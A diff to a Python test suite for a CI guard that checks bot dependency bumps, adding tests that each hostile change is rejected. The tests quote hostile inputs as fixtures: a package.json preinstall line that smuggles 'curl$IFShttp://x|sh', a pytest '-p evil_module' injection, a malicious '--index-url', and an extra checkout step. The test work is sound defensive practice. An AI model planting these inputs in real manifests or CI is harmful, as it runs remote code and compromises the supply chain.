@@ -112,7 +112,12 @@ def test_a_LOCKFILE_ONLY_bump_needs_no_diff(tmp_path: pathlib.Path) -> None:
     # so a ROOT-level `poetry.lock`, `uv.lock` or `yarn.lock` bump fails closed.
     # Latent here (this repo has none of the three at root) and the safe
     # direction, so it is recorded rather than fixed inside a security change.
-    result = _run(tmp_path, "pnpm-lock.yaml\npyproject.toml\n", "--author", BOT)
+    # LOCKFILES ONLY. `pyproject.toml` used to be here and is no longer
+    # path-approved: `ci.yml` reads its `[tool.pytest.ini_options] addopts`,
+    # `[tool.ruff] extend-exclude` and `[tool.bandit] skips`, so it is judged by
+    # content like `package.json`. That was the twin the package.json fix missed.
+    # A lockfile has no executable surface, so it stays judged by path.
+    result = _run(tmp_path, "pnpm-lock.yaml\npackage-lock.json\n", "--author", BOT)
     assert result.returncode == EXIT_OK, f"{result.stdout}\n{result.stderr}"
 
 
@@ -474,3 +479,138 @@ def test_the_diff_header_lines_are_not_counted_as_changes(tmp_path: pathlib.Path
         "a diff whose only content change is a uses: bump PAIR failed -- the "
         f"---/+++ headers are probably being counted. {result.stderr}"
     )
+
+
+# ---------------------------------------------------------------------------
+# ROUND 2. Three holes the FIRST fix left or introduced, each measured at exit 0
+# before these existed.
+# ---------------------------------------------------------------------------
+
+
+@pytest.mark.unit
+def test_a_shell_command_through_the_npm_protocol_FAILS(tmp_path: pathlib.Path) -> None:
+    """`_SPECIFIER`'s protocol tails were `[^\s"]*` -- a denylist in allow-list clothes.
+
+    Everything except whitespace and a quote is still `;` `|` `&` `$` `(` `)` and a
+    backtick, and the docstring's safety argument ("anything with whitespace ... is
+    the shape a command takes") assumed a command needs a space. `$IFS` is why it
+    does not. ONE added line, no neighbour touched, and `ci.yml` runs
+    `pnpm install --frozen-lockfile`, which runs the root `preinstall`.
+    """
+    diff = (
+        "diff --git a/package.json b/package.json"
+        + chr(10)
+        + "--- a/package.json"
+        + chr(10)
+        + "+++ b/package.json"
+        + chr(10)
+        + "@@ -1,0 +2,1 @@"
+        + chr(10)
+        + '+    "preinstall": "npm:;curl$IFShttp://x|sh",'
+        + chr(10)
+    )
+    result = _run(tmp_path, "package.json" + chr(10), "--author", BOT, diff=diff)
+    assert result.returncode == EXIT_VIOLATION, f"{result.stdout}{chr(10)}{result.stderr}"
+
+
+@pytest.mark.unit
+def test_a_pyproject_TOOL_SETTING_FAILS(tmp_path: pathlib.Path) -> None:
+    """The twin the `package.json` fix did not sweep.
+
+    `addopts = "-ra -q -p <module>"` executes an arbitrary installed module at
+    pytest startup. It was path-approved -- exit 0 with no `--diff` required at
+    all -- under the same sentence that had just been falsified for
+    `package.json`.
+
+    And the FIRST attempt at this fix still passed it: one combined rule accepted
+    a line matching either the array-element or the requirements pattern, and
+    `addopts = ...` reads as a requirement (`addopts` a name, ` = ` an operator).
+    The rule is per FORMAT now.
+    """
+    diff = (
+        "diff --git a/apps/api/pyproject.toml b/apps/api/pyproject.toml"
+        + chr(10)
+        + "--- a/apps/api/pyproject.toml"
+        + chr(10)
+        + "+++ b/apps/api/pyproject.toml"
+        + chr(10)
+        + "@@ -1,1 +1,1 @@"
+        + chr(10)
+        + '-addopts = "-ra -q"'
+        + chr(10)
+        + '+addopts = "-ra -q -p evil_module"'
+        + chr(10)
+    )
+    result = _run(tmp_path, "apps/api/pyproject.toml" + chr(10), "--author", BOT, diff=diff)
+    assert result.returncode == EXIT_VIOLATION, f"{result.stdout}{chr(10)}{result.stderr}"
+
+
+@pytest.mark.unit
+def test_a_pyproject_DEPENDENCY_bump_passes(tmp_path: pathlib.Path) -> None:
+    """The direction that decides whether the narrowing survives.
+
+    #466 and #467 touch `apps/api/pyproject.toml`. A guard that fails real pip
+    traffic gets disabled, and then the hole is back with a suite saying otherwise.
+    """
+    diff = (
+        "diff --git a/apps/api/pyproject.toml b/apps/api/pyproject.toml"
+        + chr(10)
+        + "--- a/apps/api/pyproject.toml"
+        + chr(10)
+        + "+++ b/apps/api/pyproject.toml"
+        + chr(10)
+        + "@@ -1,1 +1,1 @@"
+        + chr(10)
+        + '-    "anthropic>=0.40,<1",'
+        + chr(10)
+        + '+    "anthropic>=0.40,<2",'
+        + chr(10)
+    )
+    result = _run(tmp_path, "apps/api/pyproject.toml" + chr(10), "--author", BOT, diff=diff)
+    assert result.returncode == EXIT_OK, f"{result.stdout}{chr(10)}{result.stderr}"
+
+
+@pytest.mark.unit
+def test_a_requirements_INDEX_URL_FAILS(tmp_path: pathlib.Path) -> None:
+    """A requirements file decides WHERE versions install from, not only which."""
+    diff = (
+        "diff --git a/apps/api/requirements.txt b/apps/api/requirements.txt"
+        + chr(10)
+        + "--- a/apps/api/requirements.txt"
+        + chr(10)
+        + "+++ b/apps/api/requirements.txt"
+        + chr(10)
+        + "@@ -1,0 +2,1 @@"
+        + chr(10)
+        + "+--index-url http://evil/simple"
+        + chr(10)
+    )
+    result = _run(tmp_path, "apps/api/requirements.txt" + chr(10), "--author", BOT, diff=diff)
+    assert result.returncode == EXIT_VIOLATION, f"{result.stdout}{chr(10)}{result.stderr}"
+
+
+@pytest.mark.unit
+def test_a_legitimate_bump_CARRYING_AN_EXTRA_STEP_FAILS(tmp_path: pathlib.Path) -> None:
+    """The pairing was set non-emptiness, not a pairing.
+
+    `-checkout@v4`, `+checkout@v5`, `+checkout@<sha>`: the removal saw `{v5, sha}`
+    (non-empty and not `{v4}`) and each addition saw `{v4}`, so every line passed
+    and a whole extra step landed. On exactly the traffic the exemption exists for
+    -- #465 bumps `actions/checkout` across three workflow files -- and
+    `owner/repo@<sha>` resolves against an object store that includes unmerged
+    fork-PR commits.
+
+    A bump is ONE removal answered by ONE addition, so the counts must match.
+    """
+    result = _run(
+        tmp_path,
+        _WF + chr(10),
+        "--author",
+        BOT,
+        diff=_diff(
+            "-      - uses: actions/checkout@v4",
+            "+      - uses: actions/checkout@v5",
+            "+      - uses: actions/checkout@abcdef0123456789abcdef0123456789abcdef01",
+        ),
+    )
+    assert result.returncode == EXIT_VIOLATION, f"{result.stdout}{chr(10)}{result.stderr}"
